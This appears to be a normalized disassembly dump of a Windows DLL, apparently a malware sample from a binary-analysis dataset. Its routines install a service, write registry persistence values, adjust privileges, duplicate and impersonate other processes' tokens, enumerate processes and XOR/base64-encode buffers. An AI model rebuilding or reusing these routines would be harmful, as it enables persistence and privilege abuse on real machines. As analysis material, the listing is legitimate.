mov [ rw-data ] edx
cmp eax ecx
je r-xdata
mov eax [ rw-data ]
inc [ rw-data ]
mov [ rw-data ] eax
jmp r-xdata
push rw-data
push [ rw-data ]
call [ SetServiceStatus@IAT ]
retn
sub_10003485
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec eax
je r-xdata
push 0x3
xor ecx ecx
pop eax
call sub_10003419
push [ rw-data ]
call [ SetEvent@IAT ]
mov eax [ rw-data ]
xor ecx ecx
call sub_10003419
sub eax 0x4
jne r-xdata
pop ebp
retn 0x4
and [ rw-data ] eax
push 0xffffffff
call [ ExitProcess@IAT ]
sub_100034c7
push ebp
mov ebp esp
mov eax 0x2918
call sub_1000c6e0
push ebx
push esi
push edi
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor ebx ebx
push rw-data
push 0x80000002
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] bl
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] bl
mov esi 0x2800
push esi
lea eax [ ebp - 0x2918 ]
push ebx
push eax
call sub_10005100
add esp 0xc
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x2918 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push ebx
mov edi rw-data
push edi
push [ ebp - 0x8 ]
mov [ ebp - 0xc ] esi
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x14 ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
lea esi [ ebp - 0x2918 ]
lea ecx [ ebp + eax - 0x2918 ]
mov edx esi
cmp edx ecx
jae r-xdata
lea esi [ ebp + eax - 0x2919 ]
push r--data
push esi
call sub_10006540
push esi
call sub_10006230
mov ecx [ ebp - 0xc ]
lea eax [ ecx + eax + 0x1 ]
push esi
mov [ ebp - 0xc ] eax
call sub_10006230
add esp 0x10
mov [ esi + eax ] bx
push r--data
push esi
call sub_1000f068
pop ecx
pop ecx
test eax eax
je r-xdata
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerW@IAT ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
mov esi [ RegSetValueExA@IAT ]
lea eax [ ebp - 0x2918 ]
push eax
push 0x7
push ebx
push edi
push [ ebp - 0x8 ]
call esi
push [ ebp - 0x8 ]
mov edi [ RegCloseKey@IAT ]
mov [ ebp - 0x18 ] eax
call edi
cmp [ ebp - 0x18 ] ebx
jne r-xdata
push esi
call sub_10006230
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0xc ]
pop ecx
lea ecx [ ebp + eax - 0x2918 ]
cmp esi ecx
jb r-xdata
push ebx
push rw-data
push ebx
push ebx
push ebx
push rw-data
push 0x1
push 0x2
push 0x10
push 0xf01ff
push r--data
push r--data
push eax
call [ CreateServiceA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
push 0xfe
lea eax [ ebp - 0x117 ]
push ebx
push eax
mov [ ebp - 0x118 ] bl
call sub_10005100
push r--data
push rw-data
lea eax [ ebp - 0x118 ]
push rw-data
push eax
call sub_1000506e
add esp 0x1c
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
push 0x80000002
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
push r--data
call sub_10006230
pop ecx
push eax
push r--data
push 0x1
push ebx
push rw-data
push [ ebp - 0x8 ]
call esi
lea eax [ ebp - 0x10 ]
push eax
push rw-data
push [ ebp - 0x8 ]
call [ RegCreateKeyA@IAT ]
push [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
call edi
cmp [ ebp - 0x18 ] ebx
jne r-xdata
push rw-data
call sub_10006230
pop ecx
add eax 0x2
push eax
push rw-data
push 0x2
push ebx
push rw-data
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x10 ]
mov esi eax
call edi
cmp esi ebx
sete [ ebp - 0x1 ]
jmp r-xdata
sub_10003730
push ebp
mov ebp esp
sub esp 0x308
push ebx
push esi
push edi
jmp r-xdata
xor ebx ebx
push 0xfe
lea eax [ ebp - 0x107 ]
push ebx
push eax
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x108 ] bl
call sub_10005100
add esp 0xc
push 0xff
lea eax [ ebp - 0x108 ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x108 ]
push r--data
push eax
call sub_100064b0
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
push ebx
call [ ExitProcess@IAT ]
jmp r-xdata
push 0x1fd
lea eax [ ebp - 0x307 ]
push ebx
push eax
mov [ ebp - 0x308 ] bl
call sub_10005100
lea eax [ ebp - 0x108 ]
push eax
lea eax [ ebp - 0x308 ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x308 ]
push eax
call sub_10006230
add esp 0x1c
push eax
lea eax [ ebp - 0x308 ]
push eax
push 0x1
push ebx
push r--data
push [ ebp - 0x8 ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0x8 ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp esi ebx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x1 ] 0x1
sub_10003837
push ebp
mov ebp esp
sub esp 0x1ac
push ebx
xor ebx ebx
push 0xfe
lea eax [ ebp - 0x1ab ]
push ebx
push eax
mov [ ebp - 0x1ac ] bl
call sub_10005100
add esp 0xc
push 0xff
lea eax [ ebp - 0x1ac ]
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x1ac ]
push eax
call sub_10003e59
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0xac ]
push eax
mov [ ebp - 0xac ] 0x9c
call [ GetVersionExA@IAT ]
cmp [ ebp - 0xa8 ] 0x5
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x8
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x8 ] ebx
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x8 ] ebx
je r-xdata
push 0x4
pop eax
lea ecx [ ebp - 0xc ]
push ecx
push eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
push 0x14
push [ ebp - 0x8 ]
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
movzx eax [ ebp - 0x1 ]
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
cmp [ ebp - 0x10 ] ebx
setne [ ebp - 0x1 ]
sub_10003901
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov esi [ Sleep@IAT ]
push edi
mov edi 0x2710
push edi
call esi
call sub_10003837
test eax eax
je r-xdata
call sub_10003730
call [ GetTickCount@IAT ]
push eax
call sub_10005bd8
pop ecx
push edi
call esi
xor esi esi
push esi
push esi
push esi
push sub_100031b4
push esi
push esi
call [ CreateThread@IAT ]
mov edi [ GetMessageW@IAT ]
mov [ rw-data ] eax
jmp r-xdata
call sub_10003715
push 0x0
call [ ExitProcess@IAT ]
push esi
push esi
push esi
lea eax [ ebp - 0x1c ]
push eax
call edi
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
je r-xdata
xor eax eax
pop edi
inc eax
pop esi
leave
retn
cmp [ ebp - 0x18 ] 0x16
je r-xdata
cmp [ ebp - 0x18 ] 0x11
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageW@IAT ]
sub_100039b6
push ebp
mov ebp esp
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov esi r--data
mov edi ecx
call sub_10003d04
mov esi r--data
call sub_10003d04
push edi
xor edi edi
push edi
push 0x400
call [ OpenProcess@IAT ]
mov esi eax
cmp esi edi
je r-xdata
xor al al
lea eax [ ebp - 0x70 ]
push eax
push 0xf01ff
push esi
mov [ ebp - 0x70 ] edi
call [ OpenProcessToken@IAT ]
push esi
test eax eax
jne r-xdata
mov esi [ CloseHandle@IAT ]
call esi
push ebx
push 0x1
push 0x2
push edi
push 0x2000000
push [ ebp - 0x70 ]
call [ DuplicateTokenEx@IAT ]
push [ ebp - 0x70 ]
test eax eax
je r-xdata
call [ CloseHandle@IAT ]
jmp r-xdata
call esi
call esi
lea eax [ ebp - 0x74 ]
push eax
push edi
push edi
mov edi [ GetTokenInformation@IAT ]
push 0x1
push [ ebx ]
call edi
test eax eax
jne r-xdata
push [ ebx ]
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push [ ebp - 0x74 ]
call sub_10007b19
pop ecx
mov [ ebp - 0x78 ] eax
test eax eax
je r-xdata
lea ecx [ ebp - 0x74 ]
push ecx
push [ ebp - 0x74 ]
push eax
push 0x1
push [ ebx ]
call edi
test eax eax
jne r-xdata
mov edi [ ebp - 0x78 ]
push 0x32
pop eax
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0x7c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push [ edi ]
push 0x0
call [ LookupAccountSidA@IAT ]
push edi
test eax eax
je r-xdata
push [ ebp - 0x78 ]
call sub_100079a5
pop ecx
call sub_100079a5
pop ecx
push 0x8
pop ecx
xor eax eax
lea edi [ ebp - 0xa4 ]
[ edi ]
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x9c ] eax
lea eax [ ebp - 0xa4 ]
push eax
push [ ebx ]
mov [ ebp - 0xa4 ] 0x20
mov [ ebp - 0xa0 ] 0x1
call [ LoadUserProfileA@IAT ]
push [ ebx ]
test eax eax
je r-xdata
call [ ImpersonateLoggedOnUser@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x88 ]
mov [ ebx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ebp - 0x88 ]
push [ ebx ]
call [ UnloadUserProfile@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10008edb
leave
retn
sub_10003b6a
push ebp
mov ebp esp
sub esp 0x234
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
push r--data
or ebx 0xffffffff
call sub_100044d1
mov [ ebp - 0x234 ] eax
mov [ esp ] 0x22c
lea eax [ ebp - 0x230 ]
push 0x0
push eax
call sub_10005100
add esp 0xc
push 0x0
push 0x2
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x230 ]
push eax
push edi
mov [ ebp - 0x230 ] 0x22c
call [ Process32FirstW@IAT ]
jmp r-xdata
push [ ebp - 0x234 ]
call sub_1000517a
pop ecx
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
push [ ebp - 0x234 ]
lea eax [ ebp - 0x20c ]
push eax
call sub_100130ed
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x228 ]
lea eax [ ebp - 0x230 ]
push eax
push edi
call [ Process32NextW@IAT ]
push [ ebp - 0x234 ]
call sub_1000517a
pop ecx
push edi
call [ CloseHandle@IAT ]
sub_10003c37
push ebp
mov ebp esp
sub esp 0x298
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push rw-data
push rw-data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
and [ ebp - 0x294 ] 0x0
lea ecx [ ebp - 0x294 ]
push ecx
lea ecx [ ebp - 0x290 ]
push ecx
mov [ ebp - 0x298 ] eax
call eax
cmp eax 0x6f
jne r-xdata
xor eax eax
push [ ebp - 0x294 ]
mov esi [ GetProcessHeap@IAT ]
push 0x0
call esi
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x294 ]
push eax
push ebx
call [ ebp - 0x298 ]
test eax eax
jne r-xdata
push eax
jmp r-xdata
push ebx
mov eax ebx
push 0x0
call esi
push eax
call [ HeapFree@IAT ]
push ebx
push 0x0
call esi
push eax
call [ HeapFree@IAT ]
xor eax eax
inc eax
jmp r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
mov ecx [ eax + 0x194 ]
mov [ edi ] ecx
mov ecx [ eax + 0x198 ]
mov [ edi + 0x4 ] ecx
mov ecx [ edi ]
or ecx [ edi + 0x4 ]
jne r-xdata
sub_10003d04
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
lea eax [ ebp - 0x18 ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push esi
xor ebx ebx
push ebx
call [ LookupPrivilegeValueW@IAT ]
test eax eax
jne r-xdata
xor al al
mov eax [ ebp - 0x20 ]
push ebx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
push ebx
push 0x10
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x14 ]
push eax
push ebx
push [ ebp - 0x18 ]
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x8 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x18 ]
call [ CloseHandle@IAT ]
jmp r-xdata
mov bl 0x1
jmp r-xdata
push [ ebp - 0x18 ]
call [ CloseHandle@IAT ]
mov al bl
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
sub_10003d99
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov esi 0x400
push esi
call sub_100050f2
push esi
xor ebx ebx
mov edi eax
push ebx
push edi
call sub_10005100
add esp 0x10
push ebx
lea eax [ ebp - 0x8 ]
push eax
push ebx
push 0x1
push ebx
push ebx
push ebx
push rw-data
push 0x80000001
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push edi
lea eax [ ebp - 0x4 ]
push eax
push ebx
push rw-data
push [ ebp - 0x8 ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] esi
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x8 ]
mov esi eax
call [ RegCloseKey@IAT ]
mov eax rw-data
cmp esi ebx
je r-xdata
mov eax rw-data
mov edx edi
sub edx eax
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov esi edi
mov ecx eax
sub esi eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x4 ] 0x2
je r-xdata
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
cmp dl bl
jne r-xdata
cmp [ ebp - 0x4 ] 0x6
je r-xdata
mov edx edi
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
sub_10003e59
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x10f ]
push ebx
push eax
mov [ ebp - 0x110 ] bl
call sub_10005100
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x110 ]
add esp 0xc
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
mov [ ebp - 0xc ] bl
xor eax eax
lea edi [ ebp - 0xb ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
lea edi [ ebp - 0xc ]
call sub_10004039
mov eax rw-data
mov edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0xc ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x110 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ PathAppendA@IAT ]
push ebx
call [ SetLastError@IAT ]
mov edi [ DeleteFileA@IAT ]
lea eax [ ebp - 0x110 ]
push eax
call edi
lea eax [ ebp - 0x110 ]
push eax
call [ RemoveDirectoryA@IAT ]
mov esi [ GetFileAttributesA@IAT ]
lea eax [ ebp - 0x110 ]
push eax
call esi
cmp eax 0xffffffff
jne r-xdata
xor al al
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0xc0000000
lea eax [ ebp - 0x110 ]
push eax
call [ CreateFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
push ebx
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x110 ]
push eax
call esi
test al 0x20
je r-xdata
lea eax [ ebp - 0x110 ]
push eax
call edi
test eax eax
setne al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
sub_10003f8b
push ebp
mov ebp esp
mov eax [ esi ]
test eax eax
je r-xdata
push ebx
lea ebx [ edi + 0x2 ]
push ebx
call sub_100050f2
push ebx
push 0x0
push eax
mov [ esi ] eax
call sub_10005100
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_10005210
add esp 0x1c
cmp [ ebp + 0xc ] 0x0
mov [ esi + 0x4 ] edi
setne al
mov [ esi + 0x8 ] al
pop ebx
pop ebp
retn 0x8
push eax
call sub_1000517a
and [ esi ] 0x0
pop ecx
sub_10004039
cmp [ rw-data ] 0x0
jne r-xdata
push esi
xor esi esi
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] 0x1
call sub_10004003
push 0x1a
cdq
pop ecx
idiv ecx
add dl 0x61
mov [ esi + edi ] dl
inc esi
cmp esi 0x3
jl r-xdata
mov [ edi + 0x3 ] 0x0
pop esi
retn
sub_10004074
cmp [ rw-data ] 0x0
jne r-xdata
push esi
xor esi esi
test edi edi
jle r-xdata
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] 0x1
mov [ ebx + edi ] 0x0
pop esi
retn
call sub_10004003
push 0x1a
cdq
pop ecx
idiv ecx
add dl 0x61
mov [ esi + ebx ] dl
inc esi
cmp esi edi
jl r-xdata
sub_100040b2
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
mov edi [ GetProcessHeap@IAT ]
push 0x8
push 0x0
call edi
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
and [ ebx + 0x4 ] 0x0
mov esi 0x812
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xa ] 0x800
mov [ ebp - 0x18 ] esi
call sub_10005bea
mov [ ebp - 0x4 ] eax
shl [ ebp - 0x4 ] 0x10
call sub_10005bea
or eax [ ebp - 0x4 ]
push esi
push 0x0
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
call edi
push eax
call [ HeapAlloc@IAT ]
mov [ ebx ] eax
mov [ ebp - 0xb ] 0x0
mov edi eax
lea esi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov eax [ ebx ]
mov esi 0x800
push esi
push [ ebp + 0x8 ]
add eax 0x12
push eax
call sub_10005210
mov eax [ ebx ]
add esp 0xc
xor edi edi
push 0xffffffff
call [ ExitProcess@IAT ]
mov cl [ ebp - 0x14 ]
xor [ edi + eax + 0x12 ] cl
inc edi
cmp edi esi
jb r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
sub_1000415c
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ eax ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
mov ecx [ esi ]
xor eax eax
sub ecx 0x12
push edi
je r-xdata
mov al 0x1
jmp r-xdata
cmp [ esi + 0xd ] 0x0
mov [ esi + 0x8 ] 0x1
je r-xdata
mov cl [ esi + 0x4 ]
xor [ eax + esi + 0x12 ] cl
mov ecx [ esi ]
inc eax
sub ecx 0x12
cmp eax ecx
jb r-xdata
pop esi
pop ebx
leave
retn
mov al 0x1
mov eax [ esi + 0xe ]
mov ebx [ GetProcessHeap@IAT ]
and [ ebp - 0x8 ] 0x0
add eax 0x12
push eax
push 0x0
call ebx
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x8 ]
add eax 0x12
push ecx
push eax
mov eax [ esi ]
sub eax 0x12
lea ecx [ esi + 0x12 ]
call sub_10004e40
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
xor al al
jmp r-xdata
mov eax [ esi + 0xe ]
cmp [ ebp - 0x8 ] eax
jne r-xdata
pop edi
mov edi [ ebp - 0x4 ]
mov [ esi + 0xd ] 0x0
add eax 0x12
mov [ esi ] eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
push [ esi ]
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
sub_1000421c
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push esi
push edi
push 0x10
pop ecx
mov esi r--data
lea edi [ ebp - 0x48 ]
[ edi ] [ esi ]
mov [ ebp - 0x4c ] eax
movsb [ edi ] [ esi ]
mov edi [ ebp + 0xc ]
lea eax [ edi + 0x2 ]
cdq
push 0x3
pop ecx
idiv ecx
mov ecx [ ebp - 0x4c ]
shl eax 0x2
test ebx ebx
je r-xdata
mov [ ecx ] eax
xor eax eax
cmp [ ecx ] eax
jge r-xdata
mov [ ecx ] eax
mov eax edi
cdq
push 0x3
pop ecx
idiv ecx
mov ecx edi
xor eax eax
xor esi esi
sub ecx edx
mov [ ebp - 0x4c ] ecx
test ecx ecx
jle r-xdata
or eax 0xffffffff
jmp r-xdata
sub edi ecx
cmp edi 0x1
jne r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ edi + esi ]
movzx edx [ ecx ]
shr edx 0x2
mov dl [ ebp + edx - 0x48 ]
mov [ ebx + eax ] dl
movzx ecx [ ecx ]
shl ecx 0x4
lea edi [ edi + esi + 0x1 ]
movzx edx [ edi ]
shr edx 0x4
add edx ecx
and edx 0x3f
mov cl [ ebp + edx - 0x48 ]
mov [ ebx + eax + 0x1 ] cl
mov ecx [ ebp + 0x8 ]
movzx edi [ edi ]
lea ecx [ ecx + esi + 0x2 ]
movzx edx [ ecx ]
shr edx 0x6
lea edx [ edx + edi * 4 ]
and edx 0x3f
mov dl [ ebp + edx - 0x48 ]
mov [ ebx + eax + 0x2 ] dl
movzx ecx [ ecx ]
and ecx 0x3f
mov cl [ ebp + ecx - 0x48 ]
mov [ ebx + eax + 0x3 ] cl
mov ecx [ ebp - 0x4c ]
add esi 0x3
add eax 0x4
cmp esi ecx
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10008edb
leave
retn
cmp edi 0x2
jne r-xdata
add esi [ ebp + 0x8 ]
movzx ecx [ esi ]
shr ecx 0x2
mov cl [ ebp + ecx - 0x48 ]
mov [ ebx + eax ] cl
movzx ecx [ esi ]
and ecx 0x3
add ecx ecx
mov cl [ ebp + ecx * 8 - 0x48 ]
mov [ ebx + eax + 0x1 ] cl
mov [ ebx + eax + 0x2 ] 0x3d
jmp r-xdata
mov edi [ ebp + 0xc ]
inc eax
jmp r-xdata
add esi [ ebp + 0x8 ]
movzx ecx [ esi ]
shr ecx 0x2
mov cl [ ebp + ecx - 0x48 ]
mov [ ebx + eax ] cl
movzx ecx [ esi + 0x1 ]
movzx edx [ esi ]
shr ecx 0x4
shl edx 0x4
add ecx edx
and ecx 0x3f
mov cl [ ebp + ecx - 0x48 ]
mov [ ebx + eax + 0x1 ] cl
movzx ecx [ esi + 0x1 ]
and ecx 0xf
mov cl [ ebp + ecx * 4 - 0x48 ]
mov [ ebx + eax + 0x2 ] cl
add eax 0x3
mov [ ebx + eax ] 0x3d
sub_10004375
push ebp
mov ebp esp
sub esp 0x150
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x10
mov ebx ecx
pop ecx
mov esi r--data
lea edi [ ebp - 0x148 ]
[ edi ] [ esi ]
mov [ ebp - 0x150 ] eax
mov eax [ ebp + 0x10 ]
push 0xff
mov [ ebp - 0x14c ] eax
lea eax [ ebp - 0x103 ]
push 0x0
push eax
movsb [ edi ] [ esi ]
mov [ ebp - 0x104 ] 0x0
call sub_10005100
add esp 0xc
mov esi ebx
test ebx ebx
jle r-xdata
mov eax esi
and eax 0x80000003
jns r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + esi - 0x1 ] 0x3d
jne r-xdata
inc eax
cdq
mov edi [ ebp - 0x150 ]
sub eax edx
mov ecx eax
mov eax esi
cdq
and edx 0x3
add eax edx
sar eax 0x2
imul eax eax 0x3
sar ecx 0x1
add ecx eax
test edi edi
je r-xdata
dec eax
or eax 0xfffffffc
inc eax
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x14c ]
mov [ eax ] ecx
xor eax eax
mov edx [ ebp - 0x14c ]
cmp [ edx ] ecx
jge r-xdata
mov [ edx ] ecx
xor eax eax
or eax 0xffffffff
jmp r-xdata
movzx ecx [ ebp + eax - 0x148 ]
mov [ ebp + ecx - 0x104 ] al
inc eax
cmp eax 0x41
jl r-xdata
test ebx ebx
jle r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
mov eax [ edx ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x1 ]
shr esi 0x2
inc eax
inc esi
movzx ecx [ eax - 0x1 ]
mov cl [ ebp + ecx - 0x104 ]
movzx ebx [ eax ]
mov bl [ ebp + ebx - 0x104 ]
shl cl 0x2
shr bl 0x4
or cl bl
mov [ edi ] cl
movzx ecx [ eax + 0x1 ]
movzx ebx [ eax ]
mov cl [ ebp + ecx - 0x104 ]
mov bl [ ebp + ebx - 0x104 ]
shr cl 0x2
shl bl 0x4
or cl bl
mov [ edi + 0x1 ] cl
movzx ecx [ eax + 0x1 ]
movzx ebx [ eax + 0x2 ]
mov cl [ ebp + ecx - 0x104 ]
shl cl 0x6
or cl [ ebp + ebx - 0x104 ]
add edi 0x3
mov [ edi - 0x1 ] cl
add eax 0x4
dec esi
jne r-xdata
sub_100044d1
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ MultiByteToWideChar@IAT ]
push edi
xor edi edi
push edi
push edi
push 0xffffffff
push [ ebp + 0x8 ]
push edi
push edi
call esi
mov ebx eax
xor ecx ecx
push 0x2
pop edx
lea eax [ ebx + 0x1 ]
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_100050f2
pop ecx
push ebx
push eax
push 0xffffffff
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push edi
push edi
call esi
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
sub_1000451b
push ebp
mov ebp esp
push esi
movzx ecx cl
mov esi eax
push edi
mov eax ecx
push 0x3
cdq
pop edi
idiv edi
jmp r-xdata
cmp edx [ ebp + 0x8 ]
jl r-xdata
lea eax [ ecx + edx ]
and eax 0x80000001
jns r-xdata
pop edi
pop esi
pop ebp
retn
inc al
cmp [ ebp + 0xc ] 0x0
je r-xdata
dec eax
or eax 0xfffffffe
inc eax
sub [ esi ] al
add [ esi ] al
jmp r-xdata
movzx eax al
add edx eax
add esi eax
sub_1000455c
push ebp
mov ebp esp
movzx ecx cl
and ecx 0x80000001
push esi
jns r-xdata
inc cl
movzx esi cl
cmp esi [ ebp + 0x8 ]
jge r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
pop esi
pop ebp
retn
mov edx esi
sub edx eax
push edi
and edi 0x80000001
jns r-xdata
and edi 0x80000001
jns r-xdata
jne r-xdata
dec edi
or edi 0xfffffffe
inc edi
jne r-xdata
dec edi
or edi 0xfffffffe
inc edi
add [ eax ] cl
sub [ eax ] cl
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ edx + eax ]
je r-xdata
pop edi
add eax esi
lea edi [ edx + eax ]
cmp edi [ ebp + 0x8 ]
jl r-xdata
sub_100045ba
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and edx 0xf
dec edx
je r-xdata
